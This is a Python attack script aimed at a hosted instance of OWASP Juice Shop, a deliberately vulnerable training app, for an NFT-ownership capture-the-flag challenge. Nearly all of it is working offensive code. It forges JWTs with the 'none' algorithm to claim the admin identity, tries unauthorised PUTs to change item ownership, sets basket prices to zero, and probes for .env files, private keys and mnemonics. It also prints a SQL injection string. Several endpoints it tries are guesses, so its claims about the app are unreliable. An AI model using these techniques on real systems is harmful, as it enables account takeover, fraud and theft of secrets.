#!/usr/bin/env python3
"""
OWASP Juice Shop - Specific NFT Takeover
Target: juice5.wonkatech.org
=========================================
This focuses on the actual NFT ownership challenge in Juice Shop v18
"""

import requests
import json
import jwt
import base64
from datetime import datetime

# Disable SSL warnings for CTF
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://juice5.wonkatech.org"


def attempt_nft_takeover_method1():
    """
    Method 1: JWT Algorithm Confusion Attack
    Many Juice Shop challenges involve JWT vulnerabilities
    """
    print("\n[*] Method 1: JWT Algorithm Confusion")
    print("-" * 40)

    session = requests.Session()
    session.verify = False

    # First, get a valid token by logging in or registering
    print("[*] Getting initial JWT token...")

    # Register a test user
    test_email = f"test{datetime.now().timestamp()}@test.com"
    register_data = {
        "email": test_email,
        "password": "Test123!",
        "passwordRepeat": "Test123!",
        "securityQuestion": {"id": 1},
        "securityAnswer": "test"
    }

    response = session.post(f"{BASE_URL}/api/Users/", json=register_data)

    # Login
    login_data = {"email": test_email, "password": "Test123!"}
    response = session.post(f"{BASE_URL}/rest/user/login", json=login_data)

    if response.status_code == 200:
        token = response.json().get('authentication', {}).get('token')
        print(f"[+] Got token: {token[:50]}...")

        # Decode the JWT
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            print(f"[*] Original payload: {payload}")

            # Modify to admin/NFT owner
            payload['data']['id'] = 1  # Admin is usually ID 1
            payload['data']['email'] = 'admin@juice-sh.op'
            payload['data']['role'] = 'admin'

            # Try "none" algorithm attack
            print("[*] Attempting 'none' algorithm attack...")
            header_none = {"typ": "JWT", "alg": "none"}

            # Create token with no signature
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header_none).encode()
            ).decode().rstrip('=')

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')

            forged_token = f"{header_b64}.{payload_b64}."

            print(f"[+] Forged token: {forged_token[:50]}...")

            # Test the forged token
            headers = {"Authorization": f"Bearer {forged_token}"}
            response = session.get(f"{BASE_URL}/rest/wallet/balance", headers=headers)

            if response.status_code == 200:
                print("[+] SUCCESS! Forged token accepted!")
                print(f"    Response: {response.text}")
                return True

        except Exception as e:
            print(f"[-] JWT manipulation failed: {e}")

    return False


def attempt_nft_takeover_method2():
    """
    Method 2: Direct Wallet/NFT Endpoint Manipulation
    Look for unprotected endpoints
    """
    print("\n[*] Method 2: Direct Endpoint Manipulation")
    print("-" * 40)

    session = requests.Session()
    session.verify = False

    # Common Juice Shop endpoints for digital assets
    endpoints = [
        "/api/Wallets",
        "/api/DigitalProducts",
        "/api/Collectibles",
        "/rest/wallet/nft",
        "/api/Products",  # Some products might be NFTs
    ]

    for endpoint in endpoints:
        print(f"[*] Checking {endpoint}...")

        # GET to see structure
        response = session.get(f"{BASE_URL}{endpoint}")
        if response.status_code == 200:
            print(f"[+] Found accessible endpoint: {endpoint}")

            try:
                data = response.json()

                # Look for NFT/digital products
                if 'data' in data:
                    for item in data['data']:
                        if any(keyword in str(item).lower() for keyword in ['nft', 'digital', 'artwork', 'collectible']):
                            print(f"[!] Found potential NFT: {item}")

                            # Try to modify ownership
                            if 'id' in item:
                                item_id = item['id']

                                # Attempt PUT to change owner
                                update_payloads = [
                                    {"owner": "attacker"},
                                    {"ownerId": 1},
                                    {"userId": 1},
                                    {"walletId": 1}
                                ]

                                for payload in update_payloads:
                                    response = session.put(
                                        f"{BASE_URL}{endpoint}/{item_id}",
                                        json=payload
                                    )

                                    if response.status_code in [200, 201, 204]:
                                        print(f"[+] SUCCESS! Modified item {item_id}")
                                        print(f"    Payload: {payload}")
                                        return True

            except Exception as e:
                print(f"[-] Error processing {endpoint}: {e}")

    return False


def attempt_nft_takeover_method3():
    """
    Method 3: Exploit Product Review/Feedback for NFT products
    Some NFTs might be special products
    """
    print("\n[*] Method 3: NFT Product Exploitation")
    print("-" * 40)

    session = requests.Session()
    session.verify = False

    # Get all products
    response = session.get(f"{BASE_URL}/rest/products/search?q=")

    if response.status_code == 200:
        products = response.json()

        # Look for expensive/special products (likely NFTs)
        for product in products.get('data', []):
            price = product.get('price', 0)
            name = product.get('name', '')

            # High-value items might be NFTs
            if price > 1000 or 'artwork' in name.lower() or 'nft' in name.lower():
                print(f"[!] Potential NFT found: {name} (${price})")

                product_id = product.get('id')

                # Try to manipulate ownership via reviews or basket
                payloads = [
                    {
                        "ProductId": product_id,
                        "UserId": 1,  # Admin
                        "message": "Transferring ownership",
                        "author": "admin@juice-sh.op"
                    }
                ]

                # Try posting as admin
                for payload in payloads:
                    response = session.put(
                        f"{BASE_URL}/rest/products/{product_id}/reviews",
                        json=payload
                    )

                    if response.status_code in [200, 201]:
                        print(f"[+] Posted ownership claim for product {product_id}")

                # Try to add to basket with price manipulation
                basket_payload = {
                    "ProductId": product_id,
                    "BasketId": 1,
                    "quantity": 1,
                    "price": 0  # Free NFT!
                }

                response = session.post(
                    f"{BASE_URL}/api/BasketItems/",
                    json=basket_payload
                )

                if response.status_code in [200, 201]:
                    print(f"[+] Added NFT to basket with manipulated price!")
                    return True

    return False


def attempt_nft_takeover_method4():
    """
    Method 4: Blockchain/Web3 Simulation Exploit
    Juice Shop might simulate blockchain
    """
    print("\n[*] Method 4: Blockchain Simulation Exploit")
    print("-" * 40)

    session = requests.Session()
    session.verify = False

    # Check for blockchain/web3 endpoints
    blockchain_endpoints = [
        "/api/blockchain",
        "/api/web3",
        "/api/contracts",
        "/rest/nft/mint",
        "/rest/nft/transfer",
        "/api/metamask"
    ]

    for endpoint in blockchain_endpoints:
        response = session.get(f"{BASE_URL}{endpoint}")

        if response.status_code in [200, 401, 403]:
            print(f"[+] Found blockchain endpoint: {endpoint}")

            # Try to mint or transfer NFT
            mint_payload = {
                "to": "0x123456789",  # Fake address
                "tokenId": 1,
                "owner": "attacker"
            }

            response = session.post(f"{BASE_URL}{endpoint}", json=mint_payload)

            if response.status_code in [200, 201]:
                print(f"[+] SUCCESS! NFT operation completed at {endpoint}")
                return True

    # Try to find exposed private keys or mnemonics
    sensitive_endpoints = [
        "/api/private-key",
        "/api/mnemonic",
        "/.env",
        "/config.json",
        "/wallet.json"
    ]

    for endpoint in sensitive_endpoints:
        response = session.get(f"{BASE_URL}{endpoint}")

        if response.status_code == 200:
            print(f"[+] Found sensitive data at {endpoint}!")
            print(f"    Content: {response.text[:200]}")

            if "private" in response.text.lower() or "mnemonic" in response.text.lower():
                print("[+] Found private key/mnemonic - NFT takeover possible!")
                return True

    return False


def main():
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║     OWASP Juice Shop NFT Takeover Challenge      ║
    ║           juice5.wonkatech.org                   ║
    ║                                                   ║
    ║  This script attempts multiple methods to take   ║
    ║  ownership of NFTs in the Juice Shop challenge   ║
    ╚═══════════════════════════════════════════════════╝
    """)

    methods = [
        ("JWT Algorithm Confusion", attempt_nft_takeover_method1),
        ("Direct Endpoint Manipulation", attempt_nft_takeover_method2),
        ("NFT Product Exploitation", attempt_nft_takeover_method3),
        ("Blockchain Simulation", attempt_nft_takeover_method4)
    ]

    success = False

    for method_name, method_func in methods:
        print(f"\n{'='*50}")
        print(f"Attempting: {method_name}")
        print('='*50)

        try:
            if method_func():
                print(f"\n[+] SUCCESS with {method_name}!")
                success = True
                break
        except Exception as e:
            print(f"[-] Method failed with error: {e}")

    if not success:
        print("\n" + "="*50)
        print("MANUAL INVESTIGATION NEEDED")
        print("="*50)
        print("\nTry these manual steps:")
        print("1. Login and check browser DevTools for API calls")
        print("2. Look for 'NFT' or 'wallet' in the Network tab")
        print("3. Check JavaScript source code for hidden endpoints")
        print("4. Try SQL injection on product search: ' UNION SELECT wallet--")
        print("5. Check /api-docs or /v2/api-docs for Swagger documentation")
        print("6. Look for JWT secret in /ftp or other exposed directories")
        print("7. The expensive 'Artwork' products might be the NFTs")
        print("\nSpecific Juice Shop hints:")
        print("- The 'Best Juice Shop Salesman Artwork' (5000¤) is likely an NFT")
        print("- Try manipulating its ownership or price")
        print("- Check if you can transfer it between accounts")
        print("- Look for wallet/balance endpoints after purchasing")

    return success


if __name__ == "__main__":
    main()